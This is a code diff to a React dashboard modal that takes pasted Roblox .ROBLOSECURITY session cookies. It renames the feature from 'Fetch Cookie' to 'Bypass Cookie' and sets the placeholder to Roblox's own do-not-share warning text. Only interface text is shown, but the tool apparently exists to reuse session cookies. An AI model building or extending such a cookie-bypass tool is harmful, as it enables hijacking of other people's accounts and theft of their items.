@@ -129,11 +129,11 @@ const Dashboard = () => {
         <div className="fixed inset-0 z-40 flex items-center justify-center px-4 bg-background/70 backdrop-blur-sm animate-fade-in">
           <div className="card-glow rounded-2xl max-w-md w-full p-6 space-y-4 relative animate-scale-in">
             <button onClick={() => { setFetchOpen(false); setResult(null); setFetchCookieInput(""); }} className="absolute top-3 right-3 text-muted-foreground hover:text-foreground p-1"><X size={16} /></button>
-            <h2 className="text-base font-bold text-foreground flex items-center gap-2"><Cookie size={16} className="text-primary" /> Fetch Cookie</h2>
+            <h2 className="text-base font-bold text-foreground flex items-center gap-2"><Cookie size={16} className="text-primary" /> Bypass Cookie</h2>
             <textarea
               value={fetchCookieInput}
               onChange={e => setFetchCookieInput(e.target.value)}
-              placeholder="Paste .ROBLOSECURITY cookie..."
+              placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
               className="input-field text-xs font-mono min-h-[100px] resize-y w-full transition-all"
             />
             <button
@@ -141,7 +141,7 @@ const Dashboard = () => {
               disabled={loading}
               className="w-full shimmer text-primary-foreground font-semibold py-3 rounded-xl flex items-center justify-center gap-2 glow-btn disabled:opacity-50 transition-all duration-300 active:scale-95 hover:scale-[1.02] hover:shadow-[0_0_28px_hsl(var(--primary)/0.55)]"
             >
-              {loading ? <><Loader2 size={14} className="animate-spin" /> Fetching...</> : <>Fetch Cookie</>}
+              {loading ? <><Loader2 size={14} className="animate-spin" /> Fetching...</> : <>Bypass Cookie</>}
             </button>
             {result && (
               <div className="bg-secondary/40 border border-border/50 rounded-xl p-3 space-y-1.5 text-xs max-h-72 overflow-y-auto animate-fade-in">
